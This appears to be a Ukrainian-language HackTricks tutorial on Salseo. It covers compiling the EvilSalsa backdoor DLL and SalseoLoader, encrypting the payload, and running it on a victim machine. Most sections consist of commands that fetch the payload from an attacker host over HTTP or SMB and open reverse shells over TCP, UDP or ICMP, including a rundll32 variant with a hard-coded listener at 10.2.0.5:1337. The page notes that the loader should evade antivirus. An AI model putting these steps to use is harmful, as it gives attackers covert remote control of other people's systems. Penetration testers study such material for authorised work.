# Salseo

{{#include ../banners/hacktricks-training.md}}

## Компіляція бінарних файлів

Завантажте вихідний код з github і скомпілюйте **EvilSalsa** та **SalseoLoader**. Вам потрібно буде встановити **Visual Studio** для компіляції коду.

Скомпіліруйте ці проекти для архітектури Windows, на якій ви плануєте їх використовувати (якщо Windows підтримує x64, компілюйте їх для цієї архітектури).

Ви можете **вибрати архітектуру** в Visual Studio у **лівій вкладці "Build"** у **"Platform Target".**

(\*\*Якщо ви не можете знайти ці опції, натисніть на **"Project Tab"** і потім на **"\<Project Name> Properties"**)

![](<../images/image (132).png>)

Потім збудуйте обидва проекти (Build -> Build Solution) (У логах з'явиться шлях до виконуваного файлу):

![](<../images/image (1) (2) (1) (1) (1).png>)

## Підготовка бекдору

По-перше, вам потрібно буде закодувати **EvilSalsa.dll.** Для цього ви можете використовувати python-скрипт **encrypterassembly.py** або скомпілювати проект **EncrypterAssembly**:

### **Python**
```
python EncrypterAssembly/encrypterassembly.py <FILE> <PASSWORD> <OUTPUT_FILE>
python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.dll.txt
```
### Windows
```
EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
```
Добре, тепер у вас є все необхідне для виконання всіх Salseo дій: **закодований EvilDalsa.dll** та **бінарний файл SalseoLoader.**

**Завантажте бінарний файл SalseoLoader.exe на машину. Вони не повинні бути виявлені жодним AV...**

## **Виконання бекдору**

### **Отримання TCP зворотного шеллу (завантаження закодованого dll через HTTP)**

Не забудьте запустити nc як прослуховувач зворотного шеллу та HTTP сервер для обслуговування закодованого evilsalsa.
```
SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
```
### **Отримання UDP зворотного шеллу (завантаження закодованого dll через SMB)**

Не забудьте запустити nc як прослуховувач зворотного шеллу та SMB сервер для надання закодованого evilsalsa (impacket-smbserver).
```
SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
```
### **Отримання ICMP зворотного шелу (закодована dll вже всередині жертви)**

**Цього разу вам потрібен спеціальний інструмент на клієнті для отримання зворотного шелу. Завантажте:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)

#### **Вимкнути ICMP відповіді:**
```
sysctl -w net.ipv4.icmp_echo_ignore_all=1

#You finish, you can enable it again running:
sysctl -w net.ipv4.icmp_echo_ignore_all=0
```
#### Виконати клієнта:
```
python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
```
#### Всередині жертви, давайте виконаємо salseo:
```
SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
```
## Компіляція SalseoLoader як DLL, що експортує основну функцію

Відкрийте проект SalseoLoader за допомогою Visual Studio.

### Додайте перед основною функцією: \[DllExport]

![](<../images/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

### Встановіть DllExport для цього проекту

#### **Інструменти** --> **Менеджер пакетів NuGet** --> **Керувати пакетами NuGet для рішення...**

![](<../images/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

#### **Шукайте пакет DllExport (використовуючи вкладку Перегляд), і натисніть Встановити (і прийміть спливаюче вікно)**

![](<../images/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

У вашій папці проекту з'явилися файли: **DllExport.bat** та **DllExport_Configure.bat**

### **В**идалити DllExport

Натисніть **Видалити** (так, це дивно, але повірте, це необхідно)

![](<../images/image (5) (1) (1) (2) (1).png>)

### **Вийдіть з Visual Studio та виконайте DllExport_configure**

Просто **вийдіть** з Visual Studio

Потім перейдіть до вашої **папки SalseoLoader** і **виконайте DllExport_Configure.bat**

Виберіть **x64** (якщо ви збираєтеся використовувати його всередині x64 системи, це був мій випадок), виберіть **System.Runtime.InteropServices** (всередині **Namespace for DllExport**) і натисніть **Застосувати**

![](<../images/image (7) (1) (1) (1) (1).png>)

### **Відкрийте проект знову у Visual Studio**

**\[DllExport]** більше не повинно позначатися як помилка

![](<../images/image (8) (1).png>)

### Зберіть рішення

Виберіть **Тип виходу = Бібліотека класів** (Проект --> Властивості SalseoLoader --> Застосування --> Тип виходу = Бібліотека класів)

![](<../images/image (10) (1).png>)

Виберіть **платформу x64** (Проект --> Властивості SalseoLoader --> Збірка --> Цільова платформа = x64)

![](<../images/image (9) (1) (1).png>)

Щоб **зібрати** рішення: Збірка --> Зібрати рішення (в консолі виходу з'явиться шлях до нової DLL)

### Тестуйте згенеровану DLL

Скопіюйте та вставте DLL туди, де ви хочете її протестувати.

Виконайте:
```
rundll32.exe SalseoLoader.dll,main
```
Якщо помилка не з'являється, ймовірно, у вас є функціональний DLL!!

## Отримати оболонку, використовуючи DLL

Не забудьте використовувати **HTTP** **сервер** і налаштувати **nc** **слухача**

### Powershell
```
$env:pass="password"
$env:payload="http://10.2.0.5/evilsalsax64.dll.txt"
$env:lhost="10.2.0.5"
$env:lport="1337"
$env:shell="reversetcp"
rundll32.exe SalseoLoader.dll,main
```
### CMD
```
set pass=password
set payload=http://10.2.0.5/evilsalsax64.dll.txt
set lhost=10.2.0.5
set lport=1337
set shell=reversetcp
rundll32.exe SalseoLoader.dll,main
```
{{#include ../banners/hacktricks-training.md}}
